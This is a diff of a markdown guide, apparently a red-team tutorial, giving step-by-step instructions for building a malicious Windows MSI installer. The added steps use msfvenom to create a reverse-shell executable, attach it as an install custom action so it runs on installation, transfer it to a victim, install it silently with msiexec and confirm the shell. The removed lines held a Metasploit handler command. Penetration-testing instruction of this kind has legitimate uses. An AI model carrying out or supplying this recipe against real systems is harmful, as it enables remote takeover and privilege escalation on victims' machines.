@@ -127,53 +127,51 @@ The installation will be scheduled after you close Visual Studio. When you reope
 
 :warning: If the extension is already pre-installed, please disregard the above steps.
 
-To create a malicious MSI in Visual Studio follow the below steps:
+1) Use msfvenom to generate a malicious executable (exe) file:
 
-1) Open Visual studio, select **Create a new project** and type **installer** into search box. Select the **Setup Wizard** project and click **Next**:
+```
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > nickvourd.exe
+```
+
+2) Open Visual studio, select **Create a new project** and type **installer** into search box. Select the **Setup Wizard** project and click **Next**:
 
 ![Visual-Studio-MSI-1](/Pictures/Visual-Studio-MSI-1.png)
 
-2) Provide the project with a name, for example, **NCVInstaller**. Choose a location, for example, **C:\Payloads**, opt for **placing the solution and project in the same directory**, and then click on **Create**:
+3) Provide the project with a name, for example, **NCVInstaller**. Choose a location, for example, **C:\Payloads**, opt for **placing the solution and project in the same directory**, and then click on **Create**:
 
 ![Visual-Studio-MSI-2](/Pictures/Visual-Studio-MSI-2.png)
 
-3) Keep clicking **Next** button until you get to step 3 of 4 (choose files to include). Click **Add** and select a malicous payload (i.e, an exe from msfvenom). Then click **Finish**:
+4) Keep clicking **Next** button until you get to step 3 of 4 (choose files to include). Click **Add** and select a malicous payload (i.e, an exe from msfvenom). Then click **Finish**:
 
 ![Visual-Studio-MSI-3](/Pictures/Visual-Studio-MSI-3.png)
 
-4) Highlight the **NCVInstaller** project in the **Solution Explorer** and in the **Properties**, change the **TargetPlatform** from **x86** to **x64**:
+5) Highlight the **NCVInstaller** project in the **Solution Explorer** and in the **Properties**, change the **TargetPlatform** from **x86** to **x64**:
 
 ![Visual-Studio-MSI-4](/Pictures/Visual-Studio-MSI-4.png)
 
-5) Now right-click on the project and select **View** > **Custom Actions**:
+6) Now right-click on the project and select **View** > **Custom Actions**:
 
 ![Visual-Studio-MSI-5](/Pictures/Visual-Studio-MSI-5.png)
 
-6) Right-click on **Install** option and select **Add Custom Action**:
+7) Right-click on **Install** option and select **Add Custom Action**:
 
 ![Visual-Studio-MSI-6](/Pictures/Visual-Studio-MSI-6.png)
 
-7) Double-click on **Application Folder**, select your malicious executable file (i.e, nickvourd.exe) and click **OK**. This will ensure that the malicious payload is executed as soon as the installer is run.
+8) Double-click on **Application Folder**, select your malicious executable file (i.e, nickvourd.exe) and click **OK**. This will ensure that the malicious payload is executed as soon as the installer is run.
 
 ![Visual-Studio-MSI-7](/Pictures/Visual-Studio-MSI-7.png)
 
-8) Change **Run64Bit** option from **False** to **True**:
+9) Change **Run64Bit** option from **False** to **True**:
 
 ![Visual-Studio-MSI-8](/Pictures/Visual-Studio-MSI-8.png)
 
-9)  Build the solution.
+10)  Build the solution.
 
-10) Configure Metasploit's handler according to your selected MSI payload preferences:
+11) Open a listener on your Kali machine.
 
-```
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip_address>; set LPORT <port>; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
-```
+12) Transfer the malicious MSI file to the victim's machine.
 
-![Metasploit-Configuration](/Pictures/Metasploit-Configuration.png)
-
-11) Transfer the malicious MSI file to the victim's machine.
-
-12) Initiate the installation process for the malicious MSI package silently without any user interface:
+13) Initiate the installation process for the malicious MSI package silently without any user interface:
 
 ```
 msiexec /quiet /qn /i NCVInstaller.msi
@@ -181,7 +179,7 @@ msiexec /quiet /qn /i NCVInstaller.msi
 
 ![MSI-Execution](/Pictures/MSI-Execution.png)
 
-13) Confirm that the new session is with elevated privileges:
+14) Verify the reverse shell on your Kali machine:
 
 ![Elevated-Privileges-Confirmation](/Pictures/Elevated-Privileges-Confirmation.png)
 
